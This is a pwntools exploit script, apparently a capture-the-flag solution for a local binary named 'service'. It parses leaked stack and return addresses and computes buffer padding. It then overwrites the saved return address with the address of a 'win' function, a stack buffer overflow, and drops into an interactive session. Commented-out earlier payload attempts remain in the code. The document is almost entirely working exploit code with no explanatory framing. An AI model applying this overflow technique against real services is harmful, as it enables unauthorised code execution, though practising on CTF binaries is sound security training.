#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./service
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./service')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

r = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
r.recvuntil(b"Please select from menu: ")
r.sendline(b"1")
# io.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x05\xcbuvU\x00\x00")
# payload = 'a' * (0x7fffffffdf30 - 0x7fffffffdf10 + 8 )
# win = bytes.fromhex('55555555551a').decode('utf-8')
# c = payload + win
# print(c)
# io.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1aUUUUU\x00\x00")

# writing = b"1\n" + b"a"*40 + struct.pack("<Q",0x55555555551a)
# io.sendline(writing)

r.recvuntil(b"Current Return Address: ")
rip_savd = int(r.recvline().decode(), 16)

r.recvuntil(b"the base pointer: ")
rbp = int(r.recvline().decode(), 16)

r.recvuntil(b"will be stored: ")
buffer = int(r.recvline().decode(), 16)

rip = rbp + 8

padding = rbp - buffer + 8

print(padding)

win_addr = rip_savd - 0x17e9 + 0x151a
print(type(0x17e9))
print("win_addr ", struct.pack("<Q", win_addr))

payload = b"a"*padding + struct.pack("<Q", win_addr)

r.sendline(payload)

r.interactive()

